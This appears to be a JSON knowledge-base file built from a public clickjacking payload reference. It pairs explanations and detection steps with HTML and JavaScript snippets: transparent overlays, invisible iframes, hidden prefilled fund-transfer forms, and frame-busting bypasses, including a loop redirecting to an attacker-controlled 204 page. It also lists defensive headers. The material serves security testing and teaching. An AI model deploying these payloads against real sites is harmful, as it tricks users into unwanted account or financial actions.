@@ -1,0 +1,215 @@
+{
+  "category": "Clickjacking",
+  "source": "PayloadsAllTheThings/Clickjacking/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What Clickjacking is",
+      "language": "text",
+      "tags": ["methodology", "concept"],
+      "body": "Clickjacking (UI redressing) is an attack in which a malicious site tricks the user into clicking somewhere other than where they think. The target page is loaded in a transparent iframe over (or under) an enticing decoy interface; the user's click actually lands on a hidden button/link of the legitimate site.\n\nThis lets you perform any action available to a regular user: change the password, click \"Delete account\", like/delete a post, leave a comment, confirm a funds transfer - all without the victim's knowledge or consent."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "How to check whether a page can be framed (detection)",
+      "language": "text",
+      "tags": ["methodology", "detection", "headers"],
+      "body": "1. Load the target page in your own <iframe> on a third-party origin and open it in a browser. If the page rendered inside the frame, it is potentially vulnerable.\n2. Check the response headers of the target page:\n   • X-Frame-Options: DENY / SAMEORIGIN - framing is forbidden (entirely / from a foreign origin).\n   • Content-Security-Policy: frame-ancestors 'self' (or a list of domains) - the modern protection, takes precedence over X-Frame-Options.\n   • If both headers are absent, the page can be embedded in an iframe from any site.\n3. Check the session cookie: with SameSite=Lax/Strict the cookie may not be sent in a cross-site iframe → the action will not execute even with successful framing.\n4. Framing by itself is not yet a bug. There is impact only if the page in the frame exposes a sensitive action in one or two clicks (changing email/password, deletion, transfer, granting privileges)."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Where to look for impact",
+      "language": "text",
+      "tags": ["methodology", "impact", "recon"],
+      "body": "• State-changing actions performed in one click: \"Delete account\", \"Confirm transfer\", \"Make public\", \"Add administrator\", \"Change email/password\".\n• OAuth confirmation buttons / granting privileges to an application.\n• Likes, follows, reposts, votes - for inflation.\n• Forms whose values can be prefilled via URL parameters, leaving the user only to \"submit\" them with a click.\n• A chain of clicks (multi-step) is implemented via drag&drop or sequential iframe positioning."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Tools",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "PortSwigger Burp - Clickjacking PoC generator and header checks.\nzaproxy/zaproxy - OWASP ZAP, passive checks for X-Frame-Options / CSP.\nmachine1337/clickjack - a generator of PoC pages for clickjacking."
+    },
+
+    {
+      "subcategory": "UI Redressing",
+      "title": "Basic PoC - transparent overlay (opacity: 0)",
+      "language": "html",
+      "tags": ["poc", "ui-redressing", "overlay"],
+      "body": "<div style=\"opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;\">\n  <a href=\"malicious-link\">Click me</a>\n</div>"
+    },
+    {
+      "subcategory": "UI Redressing",
+      "title": "How UI Redressing works",
+      "language": "text",
+      "tags": ["ui-redressing", "concept"],
+      "body": "The attacker overlays a transparent UI element on top of a legitimate page. Steps:\n• Transparent element: a <div> is created that covers the entire visible area and is made invisible via opacity: 0;.\n• Positioning and layers: position: absolute; top: 0; left: 0; stretch the element across the whole viewport; because of the transparency the user does not see it.\n• Decoy elements: fake buttons/links/forms that perform an action on click are placed inside the transparent container.\n• Interaction: by clicking on the visible interface, the user actually presses the hidden elements on top of it → unintended actions."
+    },
+
+    {
+      "subcategory": "Invisible Frames",
+      "title": "Invisible iframe (zero dimensions, no border)",
+      "language": "html",
+      "tags": ["poc", "iframe", "invisible"],
+      "body": "<iframe src=\"malicious-site\" style=\"opacity: 0; height: 0; width: 0; border: none;\"></iframe>"
+    },
+    {
+      "subcategory": "Invisible Frames",
+      "title": "How invisible frames work",
+      "language": "text",
+      "tags": ["iframe", "invisible", "concept"],
+      "body": "A hidden iframe is made invisible by setting zero dimensions (height: 0; width: 0;) and removing the border (border: none;). The content inside may be a phishing form, a malware download, etc.\n• src points to a resource controlled by the attacker and loads silently.\n• Enticing elements are laid out over the invisible iframe; a transparent button is positioned exactly over the hidden content.\n• A click on the visible button = a click on the hidden content in the frame → form submission, link navigation, a financial operation without the victim's knowledge."
+    },
+
+    {
+      "subcategory": "Button/Form Hijacking",
+      "title": "Hidden form (display: none) - template",
+      "language": "html",
+      "tags": ["poc", "form-hijacking"],
+      "body": "<form action=\"malicious-site\" method=\"POST\" id=\"hidden-form\" style=\"display: none;\">\n<!-- Hidden form fields -->\n</form>"
+    },
+    {
+      "subcategory": "Button/Form Hijacking",
+      "title": "Visible button over a hidden form + submit",
+      "language": "html",
+      "tags": ["poc", "form-hijacking", "submit"],
+      "body": "<button onclick=\"submitForm()\">Click me</button>\n<form action=\"legitimate-site\" method=\"POST\" id=\"hidden-form\">\n  <!-- Hidden form fields -->\n</form>\n<script>\n  function submitForm() {\n    document.getElementById('hidden-form').submit();\n  }\n</script>"
+    },
+    {
+      "subcategory": "Button/Form Hijacking",
+      "title": "Execution - hidden form with prefilled fields",
+      "language": "html",
+      "tags": ["poc", "form-hijacking", "execution"],
+      "body": "  <form action=\"malicious-site\" method=\"POST\" id=\"hidden-form\" style=\"display: none;\">\n  <input type=\"hidden\" name=\"username\" value=\"attacker\">\n  <input type=\"hidden\" name=\"action\" value=\"transfer-funds\">\n  </form>"
+    },
+    {
+      "subcategory": "Button/Form Hijacking",
+      "title": "Execution - submit function on click",
+      "language": "javascript",
+      "tags": ["poc", "form-hijacking", "execution"],
+      "body": "  function submitForm() {\n    document.getElementById('hidden-form').submit();\n  }"
+    },
+
+    {
+      "subcategory": "Bypassing frame-busting",
+      "title": "onBeforeUnload - cancelling frame-busting (with a prompt)",
+      "language": "html",
+      "tags": ["bypass", "frame-busting", "onbeforeunload"],
+      "body": "<h1>www.fictitious.site</h1>\n<script>\n    window.onbeforeunload = function()\n    {\n        return \" Do you want to leave fictitious.site?\";\n    }\n</script>\n<iframe src=\"http://target site\">"
+    },
+    {
+      "subcategory": "Bypassing frame-busting",
+      "title": "Why onBeforeUnload breaks frame-busting",
+      "language": "text",
+      "tags": ["bypass", "frame-busting", "onbeforeunload"],
+      "body": "Frame-busting JS tries to \"break out\" of the frame by loading the target page's URL in the top window instead of the iframe. The onbeforeunload handler returns a string that is shown to the user, asking whether they want to leave the page. Seeing the prompt, the user will most likely click \"Cancel\" → navigation is aborted → the frame-busting attempt fails."
+    },
+    {
+      "subcategory": "Bypassing frame-busting",
+      "title": "204 No Content - bypass without a prompt (stub page)",
+      "language": "php",
+      "tags": ["bypass", "frame-busting", "204"],
+      "body": "<?php\n    header(\"HTTP/1.1 204 No Content\");\n?>"
+    },
+    {
+      "subcategory": "Bypassing frame-busting",
+      "title": "204 No Content - bypass without a prompt (attacker's page)",
+      "language": "javascript",
+      "tags": ["bypass", "frame-busting", "204"],
+      "body": "<script>\n    var prevent_bust = 0;\n    window.onbeforeunload = function() {\n        prevent_bust++;\n    };\n    setInterval(\n        function() {\n            if (prevent_bust > 0) {\n                prevent_bust -= 2;\n                window.top.location = \"http://attacker.site/204.php\";\n            }\n        }, 1);\n</script>\n<iframe src=\"http://target site\">"
+    },
+    {
+      "subcategory": "Bypassing frame-busting",
+      "title": "The same result without user involvement",
+      "language": "text",
+      "tags": ["bypass", "frame-busting", "204"],
+      "body": "The previous trick with a prompt requires user action. The same effect is achieved automatically: in the onBeforeUnload handler the attacker constantly (for example, every millisecond) sends navigation to a page that responds with a \"HTTP/1.1 204 No Content\" header. A 204 response causes no navigation → frame-busting does not fire, and no prompt is shown to the user."
+    },
+    {
+      "subcategory": "Bypassing frame-busting",
+      "title": "Disabling JavaScript - restricted frame (IE) and sandbox",
+      "language": "html",
+      "tags": ["bypass", "frame-busting", "sandbox"],
+      "body": "<iframe src=\"http://target site\" security=\"restricted\"></iframe>\n<iframe src=\"http://target site\" sandbox></iframe>"
+    },
+    {
+      "subcategory": "Bypassing frame-busting",
+      "title": "Disabling client-side protections",
+      "language": "text",
+      "tags": ["bypass", "frame-busting"],
+      "body": "Client-side frame-busting relies on JavaScript. If the victim has JS disabled, or the attacker can disable it within the frame, there is no protection. Three ways to deactivate frames:\n• IE (since IE6): the security=\"restricted\" attribute on a frame blocks JS, ActiveX, and redirects within it.\n• HTML5: the sandbox attribute enables a set of restrictions on the frame's content (at the time of writing - Chrome and Safari).\n• Disable JS entirely via the victim's browser settings/policy."
+    },
+    {
+      "subcategory": "Bypassing frame-busting",
+      "title": "Frame-busting code that XSS filters break",
+      "language": "html",
+      "tags": ["bypass", "frame-busting", "xss-filter"],
+      "body": "<script>\n    if ( top != self )\n    {\n        top.location=self.location;\n    }\n</script>"
+    },
+    {
+      "subcategory": "Bypassing frame-busting",
+      "title": "IE8 XSS filter - inducing a false positive",
+      "language": "html",
+      "tags": ["bypass", "xss-filter", "ie8"],
+      "body": "<iframe src=”http://target site/?param=<script>if”>"
+    },
+    {
+      "subcategory": "Bypassing frame-busting",
+      "title": "How the IE8 XSS filter helps bypass frame-busting",
+      "language": "text",
+      "tags": ["bypass", "xss-filter", "ie8"],
+      "body": "The IE8 filter sees all request/response parameters and compares them against a set of regexes, looking for reflected XSS. When it triggers, it disables all inline scripts on the page, including frame-busting scripts. So the attacker deliberately induces a false positive by inserting the start of a frame-busting script into a request parameter → the target page's protective script gets disabled."
+    },
+    {
+      "subcategory": "Bypassing frame-busting",
+      "title": "Chrome 4.0 XSSAuditor - targeted script disabling",
+      "language": "html",
+      "tags": ["bypass", "xss-filter", "xssauditor"],
+      "body": "<iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>"
+    },
+    {
+      "subcategory": "Bypassing frame-busting",
+      "title": "How XSSAuditor differs from the IE8 filter",
+      "language": "text",
+      "tags": ["bypass", "xss-filter", "xssauditor"],
+      "body": "The behavior is slightly different: the attacker deactivates a specific \"script\" by passing its code in a request parameter. This makes it possible to precisely kill exactly the snippet with the frame-busting code, leaving the page's other scripts intact."
+    },
+
+    {
+      "subcategory": "Defense (verification)",
+      "title": "X-Frame-Options (Apache)",
+      "language": "apache",
+      "tags": ["defense", "x-frame-options", "headers"],
+      "body": "Header always append X-Frame-Options SAMEORIGIN"
+    },
+    {
+      "subcategory": "Defense (verification)",
+      "title": "CSP frame-ancestors (meta tag)",
+      "language": "html",
+      "tags": ["defense", "csp", "frame-ancestors"],
+      "body": "<meta http-equiv=\"Content-Security-Policy\" content=\"frame-ancestors 'self';\">"
+    },
+    {
+      "subcategory": "Defense (verification)",
+      "title": "What to check in the headers",
+      "language": "text",
+      "tags": ["defense", "checklist", "headers"],
+      "body": "• X-Frame-Options: DENY - framing is forbidden entirely; SAMEORIGIN - only from the same origin. Deprecated, but still a working barrier.\n• Content-Security-Policy: frame-ancestors - the modern mechanism, takes precedence over X-Frame-Options. 'self' allows framing only by its own origin; you can list trusted domains.\n• Absence of both headers = the page can be embedded in an iframe from any site → a clickjacking candidate.\n• Additionally: SameSite cookies (Lax/Strict) limit sending the cookie in a cross-site frame and reduce exploitability."
+    },
+
+    {
+      "subcategory": "Exploitation",
+      "title": "Challenge - dissecting a vulnerable snippet",
+      "language": "html",
+      "tags": ["exploitation", "example"],
+      "body": "<div style=\"position: absolute; opacity: 0;\">\n  <iframe src=\"https://legitimate-site.com/login\" width=\"500\" height=\"500\"></iframe>\n</div>\n<button onclick=\"document.getElementsByTagName('iframe')[0].contentWindow.location='malicious-site.com';\">Click me</button>"
+    },
+    {
+      "subcategory": "Exploitation",
+      "title": "Walkthrough: how the hidden iframe in the example works",
+      "language": "text",
+      "tags": ["exploitation", "example"],
+      "body": "In the snippet, a transparent (opacity: 0) 500×500 iframe with the legitimate site's login page sits on top of the content. The user sees only the \"Click me\" button and assumes they are interacting with it. In reality the button's onclick triggers the first iframe's contentWindow.location and redirects it to malicious-site.com. Since the iframe is invisible, the victim does not realize their click is taking the hidden frame to the attacker's site."
+    }
+  ]
+}
